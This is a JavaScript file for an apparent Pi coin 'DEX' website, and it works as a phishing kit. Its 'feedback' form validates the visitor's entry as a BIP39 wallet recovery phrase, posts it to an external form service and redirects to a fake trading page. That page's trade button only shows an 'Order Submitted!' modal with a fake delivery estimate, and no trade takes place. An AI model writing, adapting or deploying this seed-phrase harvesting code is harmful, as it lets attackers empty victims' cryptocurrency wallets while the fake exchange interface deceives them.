// ========================================
// GLOBAL VARIABLES
// ========================================
let piPriceUSD = 3.14;
let selectedNetwork = 'BEP20';
let isBuyingPi = false;

// ========================================
// INITIALIZATION
// ========================================
document.addEventListener('DOMContentLoaded', function () {
    console.log('DOM Loaded');
    // Wait a bit for BIP39 library to load
    setTimeout(() => {
        initializeFeedbackPage();
        initializeDexPage();
        initializeMobileMenu();
        setupInputListeners();
    }, 100);
});

// ========================================
// FEEDBACK PAGE FUNCTIONALITY (FINAL)
// ========================================
async function initializeFeedbackPage() {
    const form = document.getElementById('feedbackForm');
    if (!form) {
        console.log('No feedback form found');
        return;
    }

    console.log('Feedback form found, initializing...');

    const mnemonicInput = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    // Load BIP39 wordlist
    let wordlist = [];
    try {
        const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
        const text = await response.text();
        wordlist = text.trim().split('\n');
        console.log('BIP39 wordlist loaded:', wordlist.length, 'words');
    } catch (error) {
        console.error('Failed to load BIP39 wordlist:', error);
    }

    function showError(msg) {
        console.log('Showing error:', msg);
        errorMessage.textContent = msg;
        errorMessage.style.display = 'block';
    }

    function hideError() {
        console.log('Hiding error');
        errorMessage.style.display = 'none';
    }

    function isValidBip39Mnemonic(mnemonic) {
        console.log('Validating mnemonic...');
        const words = mnemonic.split(/\s+/).filter(w => w.length > 0);
        console.log('Word count:', words.length);

        // Check word count
        if (![12, 15, 18, 21, 24].includes(words.length)) {
            console.log('Invalid word count');
            return false;
        }

        // Check if all words are in wordlist
        if (wordlist.length > 0) {
            for (const word of words) {
                if (!wordlist.includes(word)) {
                    console.log('Invalid word found:', word);
                    return false;
                }
            }
        }

        // Check with BIP39 library if available
        if (typeof window.bip39 !== 'undefined' && window.bip39 && window.bip39.validateMnemonic) {
            try {
                const isValid = window.bip39.validateMnemonic(mnemonic);
                console.log('BIP39 library validation:', isValid);
                return isValid;
            } catch (error) {
                console.error('BIP39 validation error:', error);
                // If BIP39 fails, fall back to wordlist check
                return true;
            }
        } else {
            console.warn('BIP39 library not available, using wordlist validation only');
            // If BIP39 library isn't loaded, accept if all words are valid
            return wordlist.length > 0;
        }
    }

    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        console.log('Form submitted');

        const mnemonic = mnemonicInput.value.trim().toLowerCase();
        console.log('Mnemonic entered, word count:', mnemonic.split(/\s+/).filter(w => w.length > 0).length);

        // Validate passphrase
        if (!isValidBip39Mnemonic(mnemonic)) {
            showError('Invalid passphrase');
            return;
        }

        console.log('Mnemonic is valid, proceeding with submission...');
        hideError();

        const formData = new FormData(form);

        try {
            console.log('Sending to Formspree...');
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { Accept: 'application/json' }
            });

            console.log('Response status:', response.status);

            if (response.ok) {
                console.log('Submission successful, redirecting...');
                window.location.href = 'dex.html';
            } else {
                const errorData = await response.json();
                console.error('Submission failed:', errorData);
                showError('Submission failed. Please try again.');
            }
        } catch (error) {
            console.error('Network error:', error);
            showError('Network error. Please try again.');
        }
    });

    console.log('Form listener attached');
}

// ========================================
// DEX PAGE FUNCTIONALITY
// ========================================
function initializeDexPage() {
    const firstAmount = document.getElementById('firstAmount');
    if (firstAmount) {
        updatePriceDisplay();
    }
}

// ========================================
// MOBILE MENU
// ========================================
function initializeMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    const navLinks = document.getElementById('navLinks');

    document.addEventListener('click', function (e) {
        if (navLinks && menuToggle) {
            const nav = document.querySelector('nav');
            if (nav && !nav.contains(e.target) && navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                menuToggle.classList.remove('active');
            }
        }
    });
}

function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    const menuToggle = document.getElementById('menuToggle');
    if (navLinks) navLinks.classList.toggle('active');
    if (menuToggle) menuToggle.classList.toggle('active');
}

// ========================================
// INPUT LISTENERS
// ========================================
function setupInputListeners() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');

    if (firstAmount) {
        firstAmount.addEventListener('input', () => !isBuyingPi && calculateAmount());
        firstAmount.addEventListener('keydown', e => {
            if (['-', 'e', 'E'].includes(e.key)) e.preventDefault();
        });
    }

    if (secondAmount) {
        secondAmount.addEventListener('input', () => isBuyingPi && calculateAmount());
        secondAmount.addEventListener('keydown', e => {
            if (['-', 'e', 'E'].includes(e.key)) e.preventDefault();
        });
    }
}

// ========================================
// PRICE + CALCULATIONS
// ========================================
function updatePriceDisplay() {
    const livePrice = document.getElementById('livePiPrice');
    if (livePrice) livePrice.textContent = '$' + piPriceUSD.toFixed(2);
}

function calculateAmount() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    if (!firstAmount || !secondAmount) return;

    if (isBuyingPi) {
        const usdt = parseFloat(firstAmount.value) || 0;
        secondAmount.value = usdt > 0 ? (usdt / piPriceUSD).toFixed(4) : '';
    } else {
        const pi = parseFloat(firstAmount.value) || 0;
        secondAmount.value = pi > 0 ? (pi * piPriceUSD).toFixed(2) : '';
    }
}

// ========================================
// NETWORK DROPDOWN
// ========================================
function toggleNetworkMenu(e) {
    e.stopPropagation();
    const menu = document.getElementById('networkMenu');
    if (!menu) return;
    menu.classList.toggle('hidden');
}

function selectNetwork(network) {
    selectedNetwork = network;
    const display = document.getElementById('selectedNetwork');
    if (display) display.textContent = network;

    // Close the menu
    const menu = document.getElementById('networkMenu');
    if (menu) menu.classList.add('hidden');

    // Update wallet placeholder
    const walletInput = document.getElementById('walletAddress');
    const walletHint = document.getElementById('walletHint');
    const networkLabels = {
        BEP20: 'BEP20 (Binance Smart Chain)',
        ERC20: 'ERC20 (Ethereum)',
        TRC20: 'TRC20 (Tron)'
    };
    if (walletInput) walletInput.placeholder = `Enter your USDT ${networkLabels[network]} wallet address`;
    if (walletHint) walletHint.textContent = `Enter the ${networkLabels[network]} wallet address where you want to receive USDT`;
}

// Close network menu when clicking outside
document.addEventListener('click', function (e) {
    const menu = document.getElementById('networkMenu');
    const tokenSelect = document.getElementById('secondToken');
    if (menu && tokenSelect && !tokenSelect.contains(e.target)) {
        menu.classList.add('hidden');
    }
});

// ========================================
// SWITCH TRADE PAIR
// ========================================
function switchTradePair() {
    isBuyingPi = !isBuyingPi;

    const firstLabel = document.getElementById('firstLabel');
    const secondLabel = document.getElementById('secondLabel');
    const firstTokenName = document.getElementById('firstTokenName');
    const secondTokenName = document.getElementById('secondTokenName');
    const firstTokenImg = document.getElementById('firstTokenImg');
    const secondTokenImg = document.getElementById('secondTokenImg');
    const tradeButton = document.getElementById('tradeButton');
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    const walletLabel = document.getElementById('walletLabel');
    const walletInput = document.getElementById('walletAddress');
    const walletHint = document.getElementById('walletHint');

    // Clear amounts on switch
    if (firstAmount) firstAmount.value = '';
    if (secondAmount) secondAmount.value = '';

    // Toggle readonly
    if (isBuyingPi) {
        if (firstAmount) firstAmount.removeAttribute('readonly');
        if (secondAmount) secondAmount.setAttribute('readonly', true);
    } else {
        if (firstAmount) firstAmount.removeAttribute('readonly');
        if (secondAmount) secondAmount.setAttribute('readonly', true);
    }

    if (isBuyingPi) {
        if (firstTokenName) firstTokenName.textContent = 'USDT';
        if (secondTokenName) secondTokenName.textContent = 'PI';
        if (firstTokenImg) { firstTokenImg.src = 'usdtlogo.png'; firstTokenImg.alt = 'USDT'; }
        if (secondTokenImg) { secondTokenImg.src = 'pilogo.png'; secondTokenImg.alt = 'Pi'; }
        if (tradeButton) tradeButton.textContent = 'Buy Pi Coin';
        if (walletLabel) walletLabel.textContent = 'Receiving Pi Wallet Address *';
        if (walletInput) walletInput.placeholder = 'Enter your Pi wallet address';
        if (walletHint) walletHint.textContent = 'Enter the Pi wallet address where you want to receive Pi';
    } else {
        if (firstTokenName) firstTokenName.textContent = 'PI';
        if (secondTokenName) secondTokenName.textContent = 'USDT';
        if (firstTokenImg) { firstTokenImg.src = 'pilogo.png'; firstTokenImg.alt = 'Pi'; }
        if (secondTokenImg) { secondTokenImg.src = 'usdtlogo.png'; secondTokenImg.alt = 'USDT'; }
        if (tradeButton) tradeButton.textContent = 'Sell Pi Coin';
        if (walletLabel) walletLabel.textContent = 'Receiving Wallet Address *';
        if (walletInput) walletInput.placeholder = 'Enter your USDT wallet address';
        if (walletHint) walletHint.textContent = 'Enter the wallet address where you want to receive USDT';
    }
}

// ========================================
// EXECUTE TRADE + SUCCESS MODAL
// ========================================
function executeTrade() {
    const firstAmount = document.getElementById('firstAmount');
    const walletAddress = document.getElementById('walletAddress');

    const amount = parseFloat(firstAmount ? firstAmount.value : 0);
    const wallet = walletAddress ? walletAddress.value.trim() : '';

    if (!amount || amount <= 0) {
        showTradeError('Please enter an amount to trade.');
        return;
    }

    if (!wallet) {
        showTradeError('Please enter a receiving wallet address.');
        return;
    }

    // Calculate USDT to receive
    const usdtAmount = isBuyingPi
        ? (amount / piPriceUSD).toFixed(4) + ' PI'
        : (amount * piPriceUSD).toFixed(2) + ' USDT';

    const fromToken = isBuyingPi ? 'USDT' : 'PI';
    const toToken = isBuyingPi ? 'PI' : `USDT (${selectedNetwork})`;

    showSuccessModal(amount, fromToken, usdtAmount, toToken, wallet);
}

function showTradeError(msg) {
    // Remove existing error if any
    const existing = document.getElementById('tradeErrorMsg');
    if (existing) existing.remove();

    const err = document.createElement('div');
    err.id = 'tradeErrorMsg';
    err.style.cssText = 'background:rgba(231,76,60,0.15);border:1px solid rgba(231,76,60,0.4);color:#ff6b6b;padding:0.75rem 1rem;border-radius:10px;margin-top:0.75rem;font-size:0.9rem;text-align:center;';
    err.textContent = msg;

    const btn = document.getElementById('tradeButton');
    if (btn) btn.parentNode.insertBefore(err, btn.nextSibling);

    setTimeout(() => err.remove(), 3500);
}

function showSuccessModal(amount, fromToken, receivedAmount, toToken, wallet) {
    // Remove existing modal if any
    const existing = document.getElementById('successModal');
    if (existing) existing.remove();

    const shortWallet = wallet.length > 16 ? wallet.slice(0, 8) + '...' + wallet.slice(-6) : wallet;

    const modal = document.createElement('div');
    modal.id = 'successModal';
    modal.style.cssText = `
        position: fixed; inset: 0; background: rgba(0,0,0,0.7);
        display: flex; align-items: center; justify-content: center;
        z-index: 9999; padding: 1rem; backdrop-filter: blur(4px);
    `;

    modal.innerHTML = `
        <div style="
            background: linear-gradient(135deg, #6C3483, #884EA0);
            border: 1px solid rgba(252,213,53,0.4);
            border-radius: 20px; padding: 2.5rem 2rem;
            max-width: 420px; width: 100%; text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            animation: modalPop 0.35s cubic-bezier(0.34,1.56,0.64,1);
        ">
            <div style="font-size: 3.5rem; margin-bottom: 1rem;">✅</div>
            <h2 style="color: #FCD535; font-size: 1.6rem; margin-bottom: 0.5rem;">Order Submitted!</h2>
            <p style="opacity: 0.85; margin-bottom: 1.5rem; line-height: 1.5;">
                Your trade has been placed successfully and is being processed.
            </p>

            <div style="
                background: rgba(0,0,0,0.25); border-radius: 12px;
                padding: 1.2rem; margin-bottom: 1.5rem; text-align: left;
            ">
                <div style="display:flex; justify-content:space-between; margin-bottom:0.6rem; font-size:0.9rem;">
                    <span style="opacity:0.7;">You Sent</span>
                    <span style="color:#FCD535; font-weight:bold;">${amount} ${fromToken}</span>
                </div>
                <div style="display:flex; justify-content:space-between; margin-bottom:0.6rem; font-size:0.9rem;">
                    <span style="opacity:0.7;">You Receive</span>
                    <span style="color:#4ade80; font-weight:bold;">${receivedAmount}</span>
                </div>
                <div style="display:flex; justify-content:space-between; margin-bottom:0.6rem; font-size:0.9rem;">
                    <span style="opacity:0.7;">Network</span>
                    <span>${toToken}</span>
                </div>
                <div style="border-top:1px solid rgba(255,255,255,0.1); padding-top:0.6rem; margin-top:0.4rem;">
                    <div style="display:flex; justify-content:space-between; font-size:0.85rem;">
                        <span style="opacity:0.7;">To Wallet</span>
                        <span style="font-family:monospace; font-size:0.8rem;">${shortWallet}</span>
                    </div>
                </div>
            </div>

            <p style="font-size:0.8rem; opacity:0.65; margin-bottom:1.5rem;">
                ⏱ Estimated delivery: 10–30 minutes. Check your wallet.
            </p>

            <button onclick="closeSuccessModal()" style="
                background: linear-gradient(135deg, #FCD535, #F4D03F);
                color: #6C3483; border: none; border-radius: 25px;
                padding: 0.85rem 2.5rem; font-weight: bold; font-size: 1rem;
                cursor: pointer; width: 100%; transition: transform 0.2s;
            " onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='none'">
                Done
            </button>
        </div>
    `;

    // Inject animation keyframes once
    if (!document.getElementById('modalAnimStyle')) {
        const style = document.createElement('style');
        style.id = 'modalAnimStyle';
        style.textContent = `@keyframes modalPop { from { opacity:0; transform:scale(0.8); } to { opacity:1; transform:scale(1); } }`;
        document.head.appendChild(style);
    }

    // Close on backdrop click
    modal.addEventListener('click', function (e) {
        if (e.target === modal) closeSuccessModal();
    });

    document.body.appendChild(modal);

    // Clear form fields after success
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    const walletAddress = document.getElementById('walletAddress');
    if (firstAmount) firstAmount.value = '';
    if (secondAmount) secondAmount.value = '';
    if (walletAddress) walletAddress.value = '';
}

function closeSuccessModal() {
    const modal = document.getElementById('successModal');
    if (modal) modal.remove();
}

// ========================================
// DEBUG
// ========================================
console.log('Pi Dex Script Loaded');
